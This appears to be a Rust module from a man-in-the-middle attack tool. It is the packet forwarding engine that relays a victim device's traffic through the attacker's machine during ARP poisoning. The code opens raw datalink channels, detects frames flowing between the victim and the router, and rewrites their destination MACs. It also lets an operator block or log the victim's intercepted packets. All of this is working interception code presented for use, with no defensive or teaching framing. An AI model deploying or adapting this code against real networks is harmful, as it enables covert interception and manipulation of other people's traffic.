//! Packet forwarding engine for MITM operations
//!
//! This module implements transparent packet forwarding between a victim device
//! and the router during ARP poisoning. It captures packets, determines direction,
//! applies filtering rules, and forwards them to the correct destination.

#![allow(dead_code)]

use crate::network::types::{
    ForwardAction, ForwardStats, ForwardingConfig, ForwardingRule, NetworkError, PacketDirection,
    Protocol, Result,
};
use pnet_datalink::{Channel, Config, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet_packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet_packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet_packet::tcp::{MutableTcpPacket, TcpPacket};
use pnet_packet::udp::{MutableUdpPacket, UdpPacket};
use pnet_packet::Packet;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::RwLock;
use tokio::task::JoinHandle;

/// Global forwarding state
static FORWARDING_STATE: once_cell::sync::Lazy<RwLock<HashMap<String, ForwardingSession>>> =
    once_cell::sync::Lazy::new(|| RwLock::new(HashMap::new()));

/// A single forwarding session between victim and router
#[derive(Debug)]
pub struct ForwardingSession {
    pub config: ForwardingConfig,
    pub rules: Vec<ForwardingRule>,
    pub stats: ForwardStats,
    pub handle: Option<JoinHandle<()>>,
    pub stop_signal: Option<tokio::sync::broadcast::Sender<()>>,
}

/// Initialize packet forwarding for a victim device
pub async fn start_forwarding(
    victim_mac: String,
    router_mac: String,
    interface_name: String,
) -> Result<()> {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);

    {
        let state = FORWARDING_STATE.read().await;
        if state.contains_key(&session_key) {
            return Err(NetworkError::ForwardingError(
                "Forwarding already active for this victim".to_string(),
            ));
        }
    }

    let config = ForwardingConfig {
        enabled: true,
        victim_mac: victim_mac.clone(),
        router_mac: router_mac.clone(),
        interface_name: interface_name.clone(),
        forward_stats: ForwardStats::default(),
    };

    let (stop_tx, stop_rx) = tokio::sync::broadcast::channel(1);

    let handle = tokio::spawn(forwarding_loop(
        config.clone(),
        victim_mac.clone(),
        router_mac,
        interface_name.clone(),
        stop_rx,
    ));

    let session = ForwardingSession {
        config,
        rules: Vec::new(),
        stats: ForwardStats::default(),
        handle: Some(handle),
        stop_signal: Some(stop_tx),
    };

    {
        let mut state = FORWARDING_STATE.write().await;
        state.insert(session_key, session);
    }

    log::info!(
        "Started packet forwarding for victim {} on interface {}",
        victim_mac,
        interface_name
    );

    Ok(())
}

/// Stop packet forwarding for a victim device
pub async fn stop_forwarding(
    victim_mac: &str,
    router_mac: &str,
    interface_name: &str,
) -> Result<()> {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);

    {
        let mut state = FORWARDING_STATE.write().await;
        if let Some(mut session) = state.remove(&session_key) {
            if let Some(stop_signal) = session.stop_signal.take() {
                let _ = stop_signal.send(());
            }
            if let Some(handle) = session.handle.take() {
                handle.abort();
            }
            log::info!(
                "Stopped packet forwarding for victim {} on interface {}",
                victim_mac,
                interface_name
            );
        }
    }

    Ok(())
}

/// Check if forwarding is active for a victim
pub async fn is_forwarding_active(
    victim_mac: &str,
    router_mac: &str,
    interface_name: &str,
) -> bool {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);
    let state = FORWARDING_STATE.read().await;
    state.contains_key(&session_key)
}

/// Add a forwarding rule
pub async fn add_forwarding_rule(
    victim_mac: &str,
    router_mac: &str,
    interface_name: &str,
    rule: ForwardingRule,
) -> Result<()> {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);

    let mut state = FORWARDING_STATE.write().await;
    if let Some(session) = state.get_mut(&session_key) {
        session.rules.push(rule);
        Ok(())
    } else {
        Err(NetworkError::ForwardingError(
            "Forwarding not active for this victim".to_string(),
        ))
    }
}

/// Remove a forwarding rule
pub async fn remove_forwarding_rule(
    victim_mac: &str,
    router_mac: &str,
    interface_name: &str,
    rule_id: &str,
) -> Result<bool> {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);

    let mut state = FORWARDING_STATE.write().await;
    if let Some(session) = state.get_mut(&session_key) {
        let initial_len = session.rules.len();
        session.rules.retain(|r| r.id != rule_id);
        Ok(session.rules.len() < initial_len)
    } else {
        Err(NetworkError::ForwardingError(
            "Forwarding not active for this victim".to_string(),
        ))
    }
}

/// Get forwarding rules for a victim
pub async fn get_forwarding_rules(
    victim_mac: &str,
    router_mac: &str,
    interface_name: &str,
) -> Result<Vec<ForwardingRule>> {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);

    let state = FORWARDING_STATE.read().await;
    if let Some(session) = state.get(&session_key) {
        Ok(session.rules.clone())
    } else {
        Err(NetworkError::ForwardingError(
            "Forwarding not active for this victim".to_string(),
        ))
    }
}

/// Get forwarding statistics
pub async fn get_forwarding_stats(
    victim_mac: &str,
    router_mac: &str,
    interface_name: &str,
) -> Result<ForwardStats> {
    let session_key = format!("{}-{}-{}-forwarding", victim_mac, router_mac, interface_name);

    let state = FORWARDING_STATE.read().await;
    if let Some(session) = state.get(&session_key) {
        Ok(session.stats.clone())
    } else {
        Err(NetworkError::ForwardingError(
            "Forwarding not active for this victim".to_string(),
        ))
    }
}

/// Get all active forwarding sessions
pub async fn get_active_sessions() -> Vec<(String, String, String)> {
    let state = FORWARDING_STATE.read().await;
    state
        .keys()
        .filter_map(|key| {
            let parts: Vec<&str> = key.split('-').collect();
            if parts.len() >= 3 {
                Some((parts[0].to_string(), parts[1].to_string(), parts[2].to_string()))
            } else {
                None
            }
        })
        .collect()
}

async fn forwarding_loop(
    config: ForwardingConfig,
    victim_mac: String,
    router_mac: String,
    interface_name: String,
    mut stop_rx: tokio::sync::broadcast::Receiver<()>,
) {
    let interfaces = pnet_datalink::interfaces();
    let interface = match interfaces.into_iter().find(|iface| iface.name == interface_name) {
        Some(iface) => iface,
        None => {
            log::error!("Interface {} not found", interface_name);
            return;
        }
    };

    let victim_mac_bytes = match parse_mac_bytes(&victim_mac) {
        Ok(bytes) => bytes,
        Err(e) => {
            log::error!("Invalid victim MAC address: {}", e);
            return;
        }
    };

    let router_mac_bytes = match parse_mac_bytes(&router_mac) {
        Ok(bytes) => bytes,
        Err(e) => {
            log::error!("Invalid router MAC address: {}", e);
            return;
        }
    };

    let (mut tx, rx) = match create_forwarding_channel(&interface) {
        Ok(channel) => channel,
        Err(e) => {
            log::error!("Failed to create forwarding channel: {}", e);
            return;
        }
    };
    let rx = Arc::new(Mutex::new(rx));

    let my_mac = match interface.mac {
        Some(mac) => mac.octets(),
        None => {
            log::error!("Interface {} has no MAC", interface_name);
            return;
        }
    };

    log::info!("Forwarding loop started for victim {}", victim_mac);

    loop {
        tokio::select! {
            _ = stop_rx.recv() => {
                log::info!("Forwarding loop received stop signal");
                break;
            }
            result = tokio::task::spawn_blocking({
                let rx = Arc::clone(&rx);
                move || {
                    let mut rx_guard = rx.lock().unwrap();
                    rx_guard.next().map(|p| p.to_vec())
                }
            }) => {
                match result {
                    Ok(Ok(packet)) => {
                        if let Err(e) = process_packet(
                            &packet,
                            &mut tx,
                            &interface,
                            &victim_mac_bytes,
                            &router_mac_bytes,
                            &my_mac,
                            &config,
                        ).await {
                            log::debug!("Packet processing error: {}", e);
                        }
                    }
                    Ok(Err(e)) => {
                        log::debug!("Packet receive error: {}", e);
                    }
                    Err(e) => {
                        log::error!("Packet processing task failed: {}", e);
                    }
                }
            }
        }
    }

    log::info!("Forwarding loop stopped for victim {}", victim_mac);
}

async fn process_packet(
    packet: &[u8],
    tx: &mut Box<dyn DataLinkSender + Send>,
    interface: &NetworkInterface,
    victim_mac: &[u8; 6],
    router_mac: &[u8; 6],
    my_mac: &[u8; 6],
    config: &ForwardingConfig,
) -> Result<()> {
    let ethernet = EthernetPacket::new(packet).ok_or_else(|| {
        NetworkError::ForwardingError("Failed to parse Ethernet packet".to_string())
    })?;

    if ethernet.get_ethertype() != EtherTypes::Ipv4 {
        return Ok(());
    }

    let ipv4_payload = ethernet.payload();
    let ipv4 = Ipv4Packet::new(ipv4_payload).ok_or_else(|| {
        NetworkError::ForwardingError("Failed to parse IPv4 packet".to_string())
    })?;

    let direction = determine_packet_direction(&ethernet, victim_mac, router_mac, my_mac)?;

    let should_forward = check_forwarding_rules(&ipv4, config).await?;

    if should_forward {
        let new_dest_mac = match direction {
            PacketDirection::VictimToRouter => *router_mac,
            PacketDirection::RouterToVictim => *victim_mac,
        };

        if let Err(e) = forward_packet(packet, tx, interface, &new_dest_mac).await {
            log::debug!("Failed to forward packet: {}", e);
        }
    }

    Ok(())
}

fn determine_packet_direction(
    ethernet: &EthernetPacket,
    victim_mac: &[u8; 6],
    router_mac: &[u8; 6],
    my_mac: &[u8; 6],
) -> Result<PacketDirection> {
    let src_mac = ethernet.get_source().octets();
    let dst_mac = ethernet.get_destination().octets();

    if src_mac == *victim_mac && dst_mac == *my_mac {
        Ok(PacketDirection::VictimToRouter)
    } else if src_mac == *router_mac && dst_mac == *my_mac {
        Ok(PacketDirection::RouterToVictim)
    } else {
        Err(NetworkError::ForwardingError(
            "Packet not addressed to us".to_string(),
        ))
    }
}

async fn check_forwarding_rules(
    ipv4: &Ipv4Packet<'_>,
    config: &ForwardingConfig,
) -> Result<bool> {
    let protocol = ipv4.get_next_level_protocol();
    let src_ip = ipv4.get_source();
    let dst_ip = ipv4.get_destination();

    let (packet_protocol, src_port, dst_port) = match protocol {
        pnet_packet::ip::IpNextHeaderProtocols::Tcp => {
            if let Some(tcp) = TcpPacket::new(ipv4.payload()) {
                (Protocol::TCP, tcp.get_source(), tcp.get_destination())
            } else {
                (Protocol::TCP, 0, 0)
            }
        }
        pnet_packet::ip::IpNextHeaderProtocols::Udp => {
            if let Some(udp) = UdpPacket::new(ipv4.payload()) {
                (Protocol::UDP, udp.get_source(), udp.get_destination())
            } else {
                (Protocol::UDP, 0, 0)
            }
        }
        _ => (Protocol::All, 0, 0),
    };

    let session_key = format!(
        "{}-{}-{}-forwarding",
        config.victim_mac, config.router_mac, config.interface_name
    );

    let state = FORWARDING_STATE.read().await;
    if let Some(session) = state.get(&session_key) {
        for rule in &session.rules {
            let protocol_matches = rule.protocol == Protocol::All || rule.protocol == packet_protocol;

            let port_matches = if let Some(rule_port) = rule.port {
                src_port == rule_port || dst_port == rule_port
            } else {
                true
            };

            if protocol_matches && port_matches {
                match rule.action {
                    ForwardAction::Allow => return Ok(true),
                    ForwardAction::Block => {
                        log::debug!(
                            "Blocking packet: {}:{} -> {}:{}",
                            src_ip, src_port, dst_ip, dst_port
                        );
                        return Ok(false);
                    }
                    ForwardAction::Log => {
                        log::info!(
                            "Logged packet: {}:{} -> {}:{}",
                            src_ip, src_port, dst_ip, dst_port
                        );
                    }
                    ForwardAction::Modify => {}
                }
            }
        }
    }

    Ok(true)
}

async fn forward_packet(
    original_packet: &[u8],
    tx: &mut Box<dyn DataLinkSender + Send>,
    interface: &NetworkInterface,
    new_dest_mac: &[u8; 6],
) -> Result<()> {
    let mut packet_buffer = original_packet.to_vec();

    {
        let mut eth_packet = MutableEthernetPacket::new(&mut packet_buffer).ok_or_else(|| {
            NetworkError::ForwardingError("Failed to create mutable Ethernet packet".to_string())
        })?;
        eth_packet.set_destination((*new_dest_mac).into());
    }

    if let Some(mut ipv4) = MutableIpv4Packet::new(&mut packet_buffer[14..]) {
        ipv4.set_checksum(pnet_packet::ipv4::checksum(&ipv4.to_immutable()));

        let protocol = ipv4.get_next_level_protocol();
        let payload = ipv4.payload().to_vec();

        match protocol {
            pnet_packet::ip::IpNextHeaderProtocols::Tcp => {
                if let Some(mut tcp) = MutableTcpPacket::new(&mut payload.clone()) {
                    tcp.set_checksum(0);
                    let checksum = pnet_packet::tcp::ipv4_checksum(
                        &tcp.to_immutable(),
                        &ipv4.get_source(),
                        &ipv4.get_destination(),
                    );
                    tcp.set_checksum(checksum);
                }
            }
            pnet_packet::ip::IpNextHeaderProtocols::Udp => {
                if let Some(mut udp) = MutableUdpPacket::new(&mut payload.clone()) {
                    udp.set_checksum(0);
                    let checksum = pnet_packet::udp::ipv4_checksum(
                        &udp.to_immutable(),
                        &ipv4.get_source(),
                        &ipv4.get_destination(),
                    );
                    udp.set_checksum(checksum);
                }
            }
            _ => {}
        }
    }

    let _ = tx.send_to(&packet_buffer, Some(interface.clone()));

    Ok(())
}

fn create_forwarding_channel(
    interface: &NetworkInterface,
) -> Result<(Box<dyn DataLinkSender + Send>, Box<dyn DataLinkReceiver + Send>)> {
    let config = Config {
        read_timeout: Some(Duration::from_millis(100)),
        ..Default::default()
    };

    match pnet_datalink::channel(interface, config) {
        Ok(Channel::Ethernet(tx, rx)) => Ok((tx, rx)),
        Ok(_) => Err(NetworkError::RawSocketError(
            "Unsupported channel type".to_string(),
        )),
        Err(e) => Err(NetworkError::RawSocketError(format!(
            "Failed to create channel: {} (requires root/admin)",
            e
        ))),
    }
}

fn parse_mac_bytes(mac: &str) -> Result<[u8; 6]> {
    let cleaned: String = mac
        .to_lowercase()
        .chars()
        .filter(|c| c.is_ascii_hexdigit())
        .collect();

    if cleaned.len() != 12 {
        return Err(NetworkError::InvalidMacAddress(mac.to_string()));
    }

    let mut result = [0u8; 6];
    for i in 0..6 {
        let byte_str = &cleaned[i * 2..i * 2 + 2];
        result[i] = u8::from_str_radix(byte_str, 16)
            .map_err(|_| NetworkError::InvalidMacAddress(mac.to_string()))?;
    }

    Ok(result)
}